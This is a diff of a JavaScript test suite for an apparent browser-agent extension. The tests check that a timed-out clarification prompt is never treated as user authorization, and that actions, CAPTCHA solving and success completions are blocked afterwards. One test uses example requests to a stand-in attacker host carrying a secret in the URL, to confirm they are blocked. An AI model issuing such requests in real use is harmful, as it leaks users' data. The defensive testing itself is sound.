@@ -7093,6 +7093,64 @@ test('cloud run controller uses the visible tab and persists terminal status', a
   assert.equal(session.webbrainCloudRunSnapshots[0].status, 'completed');
 });
 
+test('cloud run controller fails clarification-required terminals without schema fallback', async () => {
+  for (const structured of [false, true]) {
+    const session = {};
+    const tab = { id: structured ? 24 : 23, url: 'https://webbrain.one/', active: true, windowId: 3 };
+    const stoppedMessage = '[Agent stopped because explicit clarification authorization is required.]';
+    const controller = createCloudRunController({
+      chromeApi: {
+        tabs: {
+          query: async () => [tab],
+          get: async () => tab,
+          update: async () => tab,
+        },
+        windows: { update: async () => ({}) },
+        storage: {
+          local: { get: async () => ({ webbrainCloudBridgeEnabled: false }) },
+          session: {
+            get: async key => ({ [key]: session[key] || [] }),
+            set: async value => Object.assign(session, value),
+          },
+        },
+        runtime: { sendMessage: async () => ({ connected: false }) },
+      },
+      agent: {
+        isRunning: () => false,
+        abort: () => {},
+        processMessage: async (_tabId, _task, onUpdate) => {
+          onUpdate('run_status', {
+            status: 'clarification_required',
+            message: stoppedMessage,
+          });
+          return stoppedMessage;
+        },
+      },
+      ensureOffscreen: async () => {},
+      makeRunId: () => `run_clarification_required_${structured ? 'structured' : 'plain'}`,
+    });
+
+    const started = await controller.startRun({
+      task: 'Apply the requested change.',
+      ...(structured ? { outputSchema: { result: 'string' } } : {}),
+    });
+    await new Promise(resolve => setTimeout(resolve, 0));
+    const completed = await controller.status({ runId: started.runId });
+
+    assert.equal(completed.status, 'failed', `${structured ? 'structured' : 'plain'} cloud run treated authorization stop as completion`);
+    assert.equal(completed.error, stoppedMessage, `${structured ? 'structured' : 'plain'} cloud run lost the authorization-stop explanation`);
+    assert.equal(completed.content, stoppedMessage, `${structured ? 'structured' : 'plain'} cloud run lost terminal content`);
+    assert.equal(completed.pendingInput, null, `${structured ? 'structured' : 'plain'} cloud run retained stale pending input`);
+    assert.equal(completed.result, undefined, `${structured ? 'structured' : 'plain'} cloud run exposed a success result`);
+    assert.ok(
+      completed.updates.some(update => update.type === 'run_status' && update.data?.status === 'clarification_required'),
+      `${structured ? 'structured' : 'plain'} cloud run lost structured terminal status`,
+    );
+    assert.equal(session.webbrainCloudRunSnapshots[0].status, 'failed', `${structured ? 'structured' : 'plain'} persisted cloud run was not failed`);
+    assert.notEqual(completed.error, 'Structured cloud run finished without a valid done_json result.', 'structured authorization stop fell through to the generic schema error');
+  }
+});
+
 test('cloud run controller appends child runs to the same tab conversation', async () => {
   const session = {};
   const tab = { id: 17, url: 'https://example.com/', active: true, windowId: 3 };
@@ -14428,6 +14486,9 @@ test('clarify tool auto-timeout is configurable and mirrored across browsers', (
     assert.match(agent, /onUpdate\('clarify_auto'/, `${label}: agent should emit clarify_auto for UI lock`);
     assert.match(agent, /timeoutSec >= 0/, `${label}: Instant (0) and positive waits should arm auto-select; Off (-1) waits forever`);
     assert.match(agent, /NOT a real user confirmation/, `${label}: timeout tool note should deny user-confirmation status`);
+    assert.match(agent, /_clarificationAuthorizationBlock/, `${label}: waited timeout should arm a structural authorization guard`);
+    assert.match(agent, /requiresExplicitConfirmation: !authorized/, `${label}: clarify results should expose machine-readable authorization state`);
+    assert.match(agent, /authorizationSource: 'timeout'/, `${label}: blocked actions should identify the timeout authorization source`);
     // Permission / form confirm prompts reuse clarify plumbing but must not
     // arm the auto-timeout (first option would grant access).
     const permMatch = agent.match(/async _promptPermission\([\s\S]*?\n  \}/);
@@ -14499,6 +14560,628 @@ test('clarify tool auto-timeout is configurable and mirrored across browsers', (
     assert.match(locale, /above 1200s/, `${label}: English locale should document Off above 1200s`);
     assert.match(locale, /sp\.clarify\.auto_timeout/, `${label}: English locale should include countdown string`);
     assert.match(idLocale, /\{seconds\} dtk/, `${label}: Indonesian countdown should use seconds unit, not bare d`);
+  }
+});
+
+test('clarify result distinguishes waited timeout from user and Instant authorization', async () => {
+  for (const AgentClass of [AgentCh, AgentFx]) {
+    const agent = new AgentClass({});
+    const tabId = AgentClass === AgentCh ? 4801 : 4802;
+    agent.clarifyTimeoutSec = 1205;
+
+    const waitedTimeout = await agent.executeTool(
+      tabId,
+      'clarify',
+      { question: 'Which record?', options: ['First', 'Second'] },
+      (type, data) => {
+        if (type === 'clarify') agent.submitClarifyResponse(tabId, data.clarifyId, 'First', 'timeout');
+      },
+    );
+    assert.equal(waitedTimeout.source, 'timeout', `${AgentClass.name}: timeout source was lost`);
+    assert.equal(waitedTimeout.authorized, false, `${AgentClass.name}: waited timeout became authorization`);
+    assert.equal(waitedTimeout.requiresExplicitConfirmation, true, `${AgentClass.name}: timeout did not require an explicit answer`);
+    assert.equal(agent._clarificationAuthorizationGuards.get(tabId)?.authorized, false, `${AgentClass.name}: timeout guard was not armed`);
+
+    const userReply = await agent.executeTool(
+      tabId,
+      'clarify',
+      { question: 'Which record?', options: ['First', 'Second'] },
+      (type, data) => {
+        if (type === 'clarify') agent.submitClarifyResponse(tabId, data.clarifyId, 'Second', 'user');
+      },
+    );
+    assert.equal(userReply.authorized, true, `${AgentClass.name}: direct user reply was not authorized`);
+    assert.equal(userReply.requiresExplicitConfirmation, false, `${AgentClass.name}: direct reply kept the timeout warning`);
+    assert.equal(agent._clarificationAuthorizationGuards.has(tabId), false, `${AgentClass.name}: direct reply did not clear the timeout guard`);
+
+    agent.clarifyTimeoutSec = 0;
+    const instant = await agent.executeTool(
+      tabId,
+      'clarify',
+      { question: 'Which record?', options: ['First', 'Second'] },
+      () => {},
+    );
+    assert.equal(instant.source, 'auto', `${AgentClass.name}: Instant did not use source=auto`);
+    assert.equal(instant.authorized, true, `${AgentClass.name}: configured Instant mode was not authorized`);
+    assert.equal(agent._clarificationAuthorizationGuards.has(tabId), false, `${AgentClass.name}: Instant unexpectedly armed the timeout guard`);
+  }
+});
+
+test('waited clarify timeout guard is persisted before clarify returns', async () => {
+  for (const [index, AgentClass] of [AgentCh, AgentFx].entries()) {
+    const agent = new AgentClass({});
+    const tabId = 4803 + index;
+    agent.clarifyTimeoutSec = 1205;
+    agent.conversations.set(tabId, [{ role: 'system', content: 'system' }]);
+    agent.conversationIds.set(tabId, `conv_${tabId}`);
+
+    let releasePersist;
+    let persistStarted = false;
+    let persistedEntry = null;
+    let clarifySettled = false;
+    const persistGate = new Promise(resolve => { releasePersist = resolve; });
+    agent._persistNow = async () => {
+      persistStarted = true;
+      persistedEntry = agent._conversationStorageEntry(tabId);
+      await persistGate;
+      return true;
+    };
+
+    const clarifyPromise = agent.executeTool(
+      tabId,
+      'clarify',
+      { question: 'Which record?', options: ['First', 'Second'] },
+      (type, data) => {
+        if (type === 'clarify') agent.submitClarifyResponse(tabId, data.clarifyId, 'First', 'timeout');
+      },
+    ).then(result => {
+      clarifySettled = true;
+      return result;
+    });
+
+    await new Promise(resolve => setTimeout(resolve, 0));
+    assert.equal(persistStarted, true, `${AgentClass.name}: timeout guard persistence did not start`);
+    assert.equal(persistedEntry?.clarificationAuthorizationGuard?.authorized, false, `${AgentClass.name}: durable entry did not contain the timeout guard`);
+    assert.equal(clarifySettled, false, `${AgentClass.name}: clarify returned before timeout guard persistence completed`);
+
+    releasePersist();
+    const result = await clarifyPromise;
+    assert.equal(result.authorized, false, `${AgentClass.name}: persisted timeout became authorization`);
+  }
+});
+
+test('waited clarify timeout guard persists across restart and ordinary user turns', async () => {
+  const previousChrome = globalThis.chrome;
+  const previousBrowser = globalThis.browser;
+  try {
+    for (const [AgentClass, apiName, tabId] of [
+      [AgentCh, 'chrome', 4803],
+      [AgentFx, 'browser', 4804],
+    ]) {
+      const first = new AgentClass({});
+      first.conversations.set(tabId, [{ role: 'system', content: 'system' }]);
+      first.conversationIds.set(tabId, `conv_${tabId}`);
+      first._persist = () => {};
+      first._persistNow = async () => true;
+      await first._recordClarificationAuthorization(tabId, 'timeout');
+      const storedEntry = first._conversationStorageEntry(tabId);
+      assert.equal(storedEntry.clarificationAuthorizationGuard?.authorized, false, `${AgentClass.name}: persisted entry lost timeout guard`);
+      assert.equal(storedEntry.clarificationAuthorizationGuard?.conversationId, `conv_${tabId}`, `${AgentClass.name}: guard was not scoped to its conversation`);
+
+      globalThis[apiName] = {
+        storage: {
+          session: {
+            get: async key => ({ [key]: storedEntry }),
+          },
+        },
+      };
+      const restarted = new AgentClass({});
+      restarted._persist = () => {};
+      await restarted._hydrate(tabId);
+      assert.equal(restarted._clarificationAuthorizationGuards.get(tabId)?.authorized, false, `${AgentClass.name}: worker restart lost timeout guard`);
+
+      restarted._prepareClarificationAuthorizationForRun(tabId, { trustedContinuation: true });
+      assert.equal(restarted._clarificationAuthorizationGuards.has(tabId), true, `${AgentClass.name}: trusted continuation cleared the guard`);
+      restarted._prepareClarificationAuthorizationForRun(tabId, {});
+      assert.equal(restarted._clarificationAuthorizationGuards.has(tabId), true, `${AgentClass.name}: ordinary user turn cleared the unresolved guard`);
+
+      restarted.abort(tabId);
+      assert.equal(restarted._clarificationAuthorizationGuards.has(tabId), true, `${AgentClass.name}: Stop cleared the unresolved timeout guard`);
+      assert.equal(restarted._checkAbort(tabId), true, `${AgentClass.name}: Stop did not still cancel the active run`);
+      assert.equal(restarted._clarificationAuthorizationGuards.has(tabId), true, `${AgentClass.name}: consuming Stop also cleared the unresolved guard`);
+
+      restarted.conversationIds.set(tabId, `different_conv_${tabId}`);
+      restarted._prepareClarificationAuthorizationForRun(tabId, {});
+      assert.equal(restarted._clarificationAuthorizationGuards.has(tabId), false, `${AgentClass.name}: conversation-scoped guard leaked into a replacement conversation`);
+    }
+  } finally {
+    if (previousChrome === undefined) delete globalThis.chrome;
+    else globalThis.chrome = previousChrome;
+    if (previousBrowser === undefined) delete globalThis.browser;
+    else globalThis.browser = previousBrowser;
+  }
+});
+
+test('waited clarify timeout permits only partial or failed completion', async () => {
+  for (const AgentClass of [AgentCh, AgentFx]) {
+    const tabId = AgentClass === AgentCh ? 4807 : 4808;
+
+    for (const [name, args] of [
+      ['done', { summary: 'Everything completed.', outcome: 'success' }],
+      ['done', { summary: 'Everything completed.' }],
+      ['done_json', { result: { ok: true } }],
+    ]) {
+      const agent = new AgentClass({ getVisionProvider: async () => null });
+      let executed = false;
+      let permissionGateCalls = 0;
+      agent._persist = () => {};
+      agent._ensureGateSetting = async () => { permissionGateCalls += 1; };
+      agent.executeTool = async () => {
+        executed = true;
+        return { done: true, summary: 'should not execute', outcome: 'success' };
+      };
+      await agent._recordClarificationAuthorization(tabId, 'timeout');
+
+      const messages = [];
+      const result = await agent._executeToolBatch(
+        tabId,
+        [{ id: `completion_${name}`, function: { name, arguments: JSON.stringify(args) } }],
+        messages,
+        () => {},
+        { supportsVision: false },
+        '',
+        new Set([name]),
+        1,
+      );
+
+      assert.deepEqual(result, { action: 'continue' }, `${AgentClass.name}: ${name} success completion did not request a fresh turn`);
+      assert.equal(executed, false, `${AgentClass.name}: ${name} success completion reached executeTool`);
+      assert.equal(permissionGateCalls, 0, `${AgentClass.name}: ${name} success completion passed the authorization guard`);
+      const blocked = JSON.parse(messages[0].content);
+      assert.equal(blocked.blockedDone, true, `${AgentClass.name}: ${name} result was not marked as blocked completion`);
+      assert.equal(blocked.clarificationAuthorizationRequired, true, `${AgentClass.name}: ${name} block did not require explicit clarification`);
+    }
+
+    const completionAgent = new AgentClass({});
+    completionAgent._persist = () => {};
+    await completionAgent._recordClarificationAuthorization(tabId, 'timeout');
+    assert.equal(
+      completionAgent._clarificationAuthorizationBlock(tabId, 'done', { outcome: 'partial' }, []),
+      null,
+      `${AgentClass.name}: partial completion was blocked`,
+    );
+    assert.equal(
+      completionAgent._clarificationAuthorizationBlock(tabId, 'done', { outcome: 'failed' }, []),
+      null,
+      `${AgentClass.name}: failed completion was blocked`,
+    );
+  }
+});
+
+test('waited clarify timeout blocks CAPTCHA solve before solver dispatch', async () => {
+  for (const AgentClass of [AgentCh, AgentFx]) {
+    const agent = new AgentClass({ getVisionProvider: async () => null });
+    const tabId = AgentClass === AgentCh ? 4809 : 4810;
+    const executed = [];
+    let permissionGateCalls = 0;
+    agent._persist = () => {};
+    agent._ensureGateSetting = async () => { permissionGateCalls += 1; };
+    agent.executeTool = async (_tabId, name) => {
+      executed.push(name);
+      return { success: true, dispatched: true, injected: true };
+    };
+    await agent._recordClarificationAuthorization(tabId, 'timeout');
+
+    const messages = [];
+    const result = await agent._executeToolBatch(
+      tabId,
+      [{ id: 'captcha_after_timeout', function: { name: 'solve_captcha', arguments: '{}' } }],
+      messages,
+      () => {},
+      { supportsVision: false },
+      '',
+      new Set(['solve_captcha']),
+      1,
+    );
+
+    assert.deepEqual(result, { action: 'continue' }, `${AgentClass.name}: blocked CAPTCHA solve did not request a fresh turn`);
+    assert.deepEqual(executed, [], `${AgentClass.name}: CAPTCHA solver dispatched despite timeout guard`);
+    assert.equal(permissionGateCalls, 0, `${AgentClass.name}: permission setup ran before CAPTCHA timeout guard`);
+    const blocked = JSON.parse(messages[0].content);
+    assert.equal(blocked.clarificationAuthorizationRequired, true, `${AgentClass.name}: CAPTCHA block did not require explicit clarification`);
+    assert.equal(blocked.dispatched, false, `${AgentClass.name}: CAPTCHA block did not prove pre-dispatch denial`);
+  }
+});
+
+test('waited clarify timeout blocks outbound network reads before permission gates', async () => {
+  const calls = [
+    ['fetch_url', { url: 'https://evil.example/?secret=value', method: 'GET' }],
+    ['research_url', { url: 'https://evil.example/research' }],
+    ['read_pdf', { url: 'https://evil.example/private.pdf' }],
+    ['read_page_source', { url: 'https://evil.example/source' }],
+  ];
+  for (const AgentClass of [AgentCh, AgentFx]) {
+    for (const [index, [name, args]] of calls.entries()) {
+      const agent = new AgentClass({ getVisionProvider: async () => null });
+      const tabId = (AgentClass === AgentCh ? 4820 : 4830) + index;
+      const executed = [];
+      let permissionGateCalls = 0;
+      agent._persist = () => {};
+      agent._ensureGateSetting = async () => { permissionGateCalls += 1; };
+      agent.executeTool = async (_tabId, toolName) => {
+        executed.push(toolName);
+        return { success: true };
+      };
+      await agent._recordClarificationAuthorization(tabId, 'timeout');
+
+      const messages = [];
+      const result = await agent._executeToolBatch(
+        tabId,
+        [{ id: `network_after_timeout_${index}`, function: { name, arguments: JSON.stringify(args) } }],
+        messages,
+        () => {},
+        { supportsVision: false },
+        '',
+        new Set([name]),
+        1,
+      );
+
+      assert.deepEqual(result, { action: 'continue' }, `${AgentClass.name}: ${name} egress block should request a fresh turn`);
+      assert.deepEqual(executed, [], `${AgentClass.name}: ${name} dispatched after a waited clarification timeout`);
+      assert.equal(permissionGateCalls, 0, `${AgentClass.name}: ${name} reached permission setup before the timeout guard`);
+      const blocked = JSON.parse(messages[0].content);
+      assert.equal(blocked.clarificationAuthorizationRequired, true, `${AgentClass.name}: ${name} did not require explicit clarification`);
+      assert.equal(blocked.dispatched, false, `${AgentClass.name}: ${name} did not prove pre-dispatch denial`);
+    }
+  }
+});
+
+test('waited clarify timeout blocks consequential dispatch before permission gates', async () => {
+  for (const AgentClass of [AgentCh, AgentFx]) {
+    const agent = new AgentClass({ getVisionProvider: async () => null });
+    const tabId = AgentClass === AgentCh ? 4805 : 4806;
+    const executed = [];
+    let permissionGateCalls = 0;
+    agent._persist = () => {};
+    agent._ensureGateSetting = async () => { permissionGateCalls += 1; };
+    agent._skipPermissionGate = true;
+    agent.executeTool = async (_tabId, name) => {
+      executed.push(name);
+      return { success: true };
+    };
+    await agent._recordClarificationAuthorization(tabId, 'timeout');
+
+    assert.equal(agent._clarificationAuthorizationBlock(tabId, 'read_page', {}, []), null, `${AgentClass.name}: read-only inspection was blocked`);
+    assert.equal(agent._clarificationAuthorizationBlock(tabId, 'navigate', {}, [Capability.NAVIGATE]), null, `${AgentClass.name}: direct navigation was blocked`);
+    assert.equal(agent._clarificationAuthorizationBlock(tabId, 'resize_window', {}, [Capability.WINDOW]), null, `${AgentClass.name}: window-only action was blocked`);
+    assert.equal(agent._clarificationAuthorizationBlock(tabId, 'read_pdf', {}, []), null, `${AgentClass.name}: active-tab PDF read was blocked`);
+    assert.equal(agent._clarificationAuthorizationBlock(tabId, 'clarify', {}, []), null, `${AgentClass.name}: re-clarification was blocked`);
+
+    const firstMessages = [];
+    const firstResult = await agent._executeToolBatch(
+      tabId,
+      [
+        { id: 'mutate_1', function: { name: 'click_ax', arguments: '{"ref_id":"ref_duplicate"}' } },
+        { id: 'read_after_block', function: { name: 'read_page', arguments: '{}' } },
+      ],
+      firstMessages,
+      () => {},
+      { supportsVision: false },
+      '',
+      new Set(['click_ax', 'read_page']),
+      1,
+    );
+    assert.deepEqual(firstResult, { action: 'continue' }, `${AgentClass.name}: first blocked action should request a fresh model turn`);
+    assert.equal(executed.length, 0, `${AgentClass.name}: consequential tool dispatched despite timeout guard`);
+    assert.equal(permissionGateCalls, 0, `${AgentClass.name}: permission gate ran before timeout authorization guard`);
+    assert.equal(firstMessages.length, 2, `${AgentClass.name}: remaining batch call did not receive a synthetic result`);
+    const denied = JSON.parse(firstMessages[0].content);
+    const skipped = JSON.parse(firstMessages[1].content);
+    assert.equal(denied.clarificationAuthorizationRequired, true, `${AgentClass.name}: block result did not request explicit clarification`);
+    assert.equal(denied.dispatched, false, `${AgentClass.name}: block result did not prove pre-dispatch denial`);
+    assert.equal(skipped.skipped, true, `${AgentClass.name}: later batch call was not skipped`);
+
+    // The model may follow the recovery nudge and ask again. If that second
+    // clarification also times out, it must not reset the blocked-attempt
+    // counter and permit an endless timeout/retry loop.
+    await agent._recordClarificationAuthorization(tabId, 'timeout');
+    assert.equal(agent._clarificationAuthorizationGuards.get(tabId)?.blockedAttempts, 1, `${AgentClass.name}: repeated timeout reset the blocked-attempt counter`);
+
+    const secondMessages = [];
+    const secondResult = await agent._executeToolBatch(
+      tabId,
+      [{ id: 'mutate_2', function: { name: 'fetch_url', arguments: '{"url":"https://example.com/duplicate","method":"POST"}' } }],
+      secondMessages,
+      () => {},
+      { supportsVision: false },
+      '',
+      new Set(['fetch_url']),
+      2,
+    );
+    assert.equal(secondResult.action, 'return', `${AgentClass.name}: repeated blocked action did not stop the run`);
+    assert.equal(secondResult.status, 'clarification_required', `${AgentClass.name}: repeated block returned the wrong status`);
+    assert.equal(executed.length, 0, `${AgentClass.name}: second consequential tool dispatched`);
+  }
+});
+
+test('waited clarify timeout blocked actions fail closed at the step limit', async () => {
+  for (const [index, AgentClass] of [AgentCh, AgentFx].entries()) {
+    const provider = {
+      supportsTools: true,
+      supportsVision: false,
+      promptTier: 'full',
+      contextWindow: 128000,
+      model: 'test-model',
+      name: 'test-provider',
+      calls: 0,
+      chat: async () => {
+        provider.calls += 1;
+        return {
+          content: null,
+          toolCalls: [{
+            id: `timeout_final_action_${index}`,
+            function: { name: 'click_ax', arguments: '{"ref_id":"ref_timeout_final"}' },
+          }],
+        };
+      },
+    };
+    const agent = new AgentClass({
+      getActive: () => provider,
+      getVisionProvider: async () => null,
+    });
+    const tabId = 4830 + index;
+    configurePlanOnlyGuardAgent(agent, tabId);
+    agent.maxSteps = 1;
+    const executed = [];
+    agent.executeTool = async (_tabId, name) => {
+      executed.push(name);
+      return { success: true };
+    };
+    await agent._recordClarificationAuthorization(tabId, 'timeout');
+    const updates = [];
+
+    const final = await agent.processMessage(
+      tabId,
+      'Apply the requested change.',
+      (type, data) => updates.push({ type, data }),
+      'act',
+    );
+
+    assert.equal(final, agent._clarificationAuthorizationStopMessage(), `${AgentClass.name}: final-step action block fell through to max_steps`);
+    assert.equal(provider.calls, 1, `${AgentClass.name}: final-step action block requested another model turn`);
+    assert.deepEqual(executed, [], `${AgentClass.name}: final-step action reached tool dispatch`);
+    assert.ok(
+      updates.some(update => update.type === 'run_status' && update.data?.status === 'clarification_required'),
+      `${AgentClass.name}: final-step action block lost clarification-required status`,
+    );
+    assert.equal(
+      updates.some(update => update.type === 'max_steps_reached'),
+      false,
+      `${AgentClass.name}: generic max-step fallback replaced the authorization stop`,
+    );
+  }
+});
+
+test('waited clarify timeout blocks plain finals after a denied action', async () => {
+  for (const streaming of [false, true]) {
+    for (const [index, AgentClass] of [AgentCh, AgentFx].entries()) {
+      const responses = [
+        {
+          content: null,
+          toolCalls: [{
+            id: `timeout_action_${streaming}_${index}`,
+            function: { name: 'click_ax', arguments: '{"ref_id":"ref_timeout"}' },
+          }],
+        },
+        { content: 'Done.', toolCalls: [] },
+      ];
+      const provider = {
+        supportsTools: true,
+        supportsVision: false,
+        promptTier: 'full',
+        contextWindow: 128000,
+        model: 'test-model',
+        name: 'test-provider',
+        calls: 0,
+      };
+      if (streaming) {
+        provider.chatStream = async function* () {
+          this.calls += 1;
+          const next = responses.shift();
+          assert.ok(next, `${AgentClass.name}: streamed timeout guard called the model too many times`);
+          if (next.content) yield { type: 'text', content: next.content };
+          if (next.toolCalls?.length) {
+            yield {
+              type: 'tool_call',
+              content: next.toolCalls.map((call, toolIndex) => ({
+                index: toolIndex,
+                id: call.id,
+                function: call.function,
+              })),
+            };
+          }
+          yield { type: 'done' };
+        };
+      } else {
+        provider.chat = async () => {
+          provider.calls += 1;
+          const next = responses.shift();
+          assert.ok(next, `${AgentClass.name}: timeout guard called the model too many times`);
+          return next;
+        };
+      }
+
+      const agent = new AgentClass({
+        getActive: () => provider,
+        getVisionProvider: async () => null,
+      });
+      const tabId = 4840 + (streaming ? 10 : 0) + index;
+      configurePlanOnlyGuardAgent(agent, tabId);
+      const executed = [];
+      agent.executeTool = async (_tabId, name) => {
+        executed.push(name);
+        return { success: true };
+      };
+      await agent._recordClarificationAuthorization(tabId, 'timeout');
+      const updates = [];
+      const run = streaming ? agent.processMessageStream.bind(agent) : agent.processMessage.bind(agent);
+
+      const final = await run(
+        tabId,
+        'Apply the requested change.',
+        (type, data) => updates.push({ type, data }),
+        'act',
+      );
+
+      assert.equal(final, agent._clarificationAuthorizationStopMessage(), `${AgentClass.name}/${streaming ? 'stream' : 'non-stream'}: plain final escaped the timeout guard`);
+      assert.deepEqual(executed, [], `${AgentClass.name}/${streaming ? 'stream' : 'non-stream'}: denied action reached tool dispatch`);
+      assert.equal(provider.calls, 2, `${AgentClass.name}/${streaming ? 'stream' : 'non-stream'}: timeout guard did not stop after the plain-final laundering attempt`);
+      assert.equal(responses.length, 0, `${AgentClass.name}/${streaming ? 'stream' : 'non-stream'}: timeout guard left unexpected model responses`);
+      assert.equal(agent._clarificationAuthorizationGuards.get(tabId)?.blockedAttempts, 2, `${AgentClass.name}/${streaming ? 'stream' : 'non-stream'}: plain final was not counted as a second blocked completion attempt`);
+      assert.ok(
+        updates.some(update => update.type === 'run_status' && update.data?.status === 'clarification_required'),
+        `${AgentClass.name}/${streaming ? 'stream' : 'non-stream'}: plain-final stop did not propagate terminal run status`,
+      );
+      assert.equal(
+        updates.some(update => update.type === 'text' && /Done\./.test(String(update.data?.content || ''))),
+        false,
+        `${AgentClass.name}/${streaming ? 'stream' : 'non-stream'}: rejected plain final remained visible`,
+      );
+    }
+  }
+});
+
+test('waited clarify timeout persists plain-final attempts before retrying', async () => {
+  for (const streaming of [false, true]) {
+    for (const [index, AgentClass] of [AgentCh, AgentFx].entries()) {
+      const responses = [
+        { content: 'Done.', toolCalls: [] },
+        { content: 'Done again.', toolCalls: [] },
+      ];
+      const provider = {
+        supportsTools: true,
+        supportsVision: false,
+        promptTier: 'full',
+        contextWindow: 128000,
+        model: 'test-model',
+        name: 'test-provider',
+        calls: 0,
+      };
+      if (streaming) {
+        provider.chatStream = async function* () {
+          this.calls += 1;
+          const next = responses.shift();
+          assert.ok(next, `${AgentClass.name}: streamed persistence guard called the model too many times`);
+          yield { type: 'text', content: next.content };
+          yield { type: 'done' };
+        };
+      } else {
+        provider.chat = async () => {
+          provider.calls += 1;
+          const next = responses.shift();
+          assert.ok(next, `${AgentClass.name}: persistence guard called the model too many times`);
+          return next;
+        };
+      }
+
+      const agent = new AgentClass({
+        getActive: () => provider,
+        getVisionProvider: async () => null,
+      });
+      const tabId = 4856 + (streaming ? 10 : 0) + index;
+      configurePlanOnlyGuardAgent(agent, tabId);
+      await agent._recordClarificationAuthorization(tabId, 'timeout');
+
+      let releasePersist;
+      let persistCalls = 0;
+      let runSettled = false;
+      const persistGate = new Promise(resolve => { releasePersist = resolve; });
+      agent._persistNow = async () => {
+        persistCalls += 1;
+        if (persistCalls === 1) await persistGate;
+        return true;
+      };
+      const run = streaming ? agent.processMessageStream.bind(agent) : agent.processMessage.bind(agent);
+      const runPromise = run(tabId, 'Apply the requested change.', () => {}, 'act').then(result => {
+        runSettled = true;
+        return result;
+      });
+
+      await new Promise(resolve => setTimeout(resolve, 0));
+      assert.equal(persistCalls, 1, `${AgentClass.name}/${streaming ? 'stream' : 'non-stream'}: first plain-final attempt was not persisted immediately`);
+      assert.equal(provider.calls, 1, `${AgentClass.name}/${streaming ? 'stream' : 'non-stream'}: second model turn started before persistence`);
+      assert.equal(runSettled, false, `${AgentClass.name}/${streaming ? 'stream' : 'non-stream'}: run settled while persistence was pending`);
+      assert.equal(agent._clarificationAuthorizationGuards.get(tabId)?.blockedAttempts, 1, `${AgentClass.name}/${streaming ? 'stream' : 'non-stream'}: pending snapshot lost the first blocked attempt`);
+
+      releasePersist();
+      const final = await runPromise;
+      assert.equal(final, agent._clarificationAuthorizationStopMessage(), `${AgentClass.name}/${streaming ? 'stream' : 'non-stream'}: repeated plain final did not fail closed`);
+      assert.equal(provider.calls, 2, `${AgentClass.name}/${streaming ? 'stream' : 'non-stream'}: retry did not resume after persistence`);
+      assert.equal(persistCalls, 2, `${AgentClass.name}/${streaming ? 'stream' : 'non-stream'}: terminal blocked attempt was not persisted immediately`);
+    }
+  }
+});
+
+test('waited clarify timeout plain finals fail closed at the step limit', async () => {
+  for (const streaming of [false, true]) {
+    for (const [index, AgentClass] of [AgentCh, AgentFx].entries()) {
+      const provider = {
+        supportsTools: true,
+        supportsVision: false,
+        promptTier: 'full',
+        contextWindow: 128000,
+        model: 'test-model',
+        name: 'test-provider',
+      };
+      if (streaming) {
+        provider.chatStream = async function* () {
+          yield { type: 'text', content: 'Done.' };
+          yield { type: 'done' };
+        };
+      } else {
+        provider.chat = async () => ({ content: 'Done.', toolCalls: [] });
+      }
+
+      const agent = new AgentClass({
+        getActive: () => provider,
+        getVisionProvider: async () => null,
+      });
+      const tabId = 4860 + (streaming ? 10 : 0) + index;
+      configurePlanOnlyGuardAgent(agent, tabId);
+      agent.maxSteps = 1;
+      await agent._recordClarificationAuthorization(tabId, 'timeout');
+      const updates = [];
+      const run = streaming ? agent.processMessageStream.bind(agent) : agent.processMessage.bind(agent);
+
+      const final = await run(
+        tabId,
+        'Apply the requested change.',
+        (type, data) => updates.push({ type, data }),
+        'act',
+      );
+
+      assert.equal(final, agent._clarificationAuthorizationStopMessage(), `${AgentClass.name}/${streaming ? 'stream' : 'non-stream'}: step limit accepted a guarded plain final`);
+      assert.ok(
+        updates.some(update => update.type === 'run_status' && update.data?.status === 'clarification_required'),
+        `${AgentClass.name}/${streaming ? 'stream' : 'non-stream'}: step-limit stop lost clarification-required status`,
+      );
+      assert.equal(
+        updates.some(update => update.type === 'max_steps_reached'),
+        false,
+        `${AgentClass.name}/${streaming ? 'stream' : 'non-stream'}: max-step fallback replaced the authorization stop`,
+      );
+    }
+  }
+});
+
+test('agent propagates status-bearing terminal tool-batch returns to callers', () => {
+  for (const [label, rel] of [
+    ['chrome', 'src/chrome/src/agent/agent.js'],
+    ['firefox', 'src/firefox/src/agent/agent.js'],
+  ]) {
+    const source = fs.readFileSync(path.join(ROOT, rel), 'utf8');
+    const emissions = source.match(/onUpdate\('run_status', \{ status: batchResult\.status, message: batchResult\.value \}\);/g) || [];
+    assert.equal(emissions.length, 2, `${label}: streaming and non-streaming terminal returns must both propagate run status`);
   }
 });
 
@@ -15936,6 +16619,7 @@ function makeSchedulerHarness(SchedulerMod, opts = {}) {
   const agent = {
     isRunning: opts.isRunning || (() => false),
     getConversationId: opts.getConversationId || (async () => 'conv-1'),
+    requireExplicitClarificationAuthorization: opts.requireExplicitClarificationAuthorization || (async () => {}),
     processMessage: opts.processMessage || (async () => 'scheduled result'),
     abort: opts.abort || (() => {}),
     setScheduledRunPolicy() {},
@@ -16841,6 +17525,123 @@ test('ScheduledJobManager keeps live scheduled clarifications resumable', async 
   }
 });
 
+test('ScheduledJobManager preserves clarification-required terminal runs as needing input', async () => {
+  const now = Date.UTC(2026, 0, 1, 12, 0, 0);
+  for (const [label, SchedulerMod] of [['chrome', SchedulerCh], ['firefox', SchedulerFx]]) {
+    const stoppedMessage = '[Agent stopped before dispatching another consequential action. Please answer the clarification and retry.]';
+    const h = makeSchedulerHarness(SchedulerMod, {
+      now,
+      processMessage: async (_tabId, _message, onUpdate) => {
+        onUpdate('clarify', { clarifyId: 'clr-timeout', question: 'Should I submit this?' });
+        onUpdate('clarify_auto', { clarifyId: 'clr-timeout', reason: 'timeout' });
+        onUpdate('run_status', { status: 'clarification_required', message: stoppedMessage });
+        return stoppedMessage;
+      },
+    });
+    const created = await h.manager.createResumeJob({
+      tabId: 77,
+      conversationId: 'conv-1',
+      args: { after_seconds: 60, reason: 'wait', resume_instruction: 'submit when authorized' },
+    });
+
+    await h.manager.handleAlarm(h.alarmName(created.jobId));
+
+    const job = h.jobs()[0];
+    assert.equal(job.status, 'needs_user_input', `${label}: clarification-required run must not be completed`);
+    assert.equal(job.clarificationRequired, true, `${label}: terminal authorization stop should be distinguished from a live clarification`);
+    assert.equal(job.lastResult, stoppedMessage, `${label}: terminal explanation should be preserved`);
+    assert.equal(job.lastOutcome, null, `${label}: clarification-required run must not record success`);
+    assert.equal(job.runCount, 0, `${label}: clarification-required run must not increment completed run count`);
+    assert.equal(job.pendingClarify, null, `${label}: timed-out clarification must not remain answerable`);
+    assert.match(job.lastError, /user input or authorization is required/i, `${label}: stored job should explain why it stopped`);
+    assert.equal(
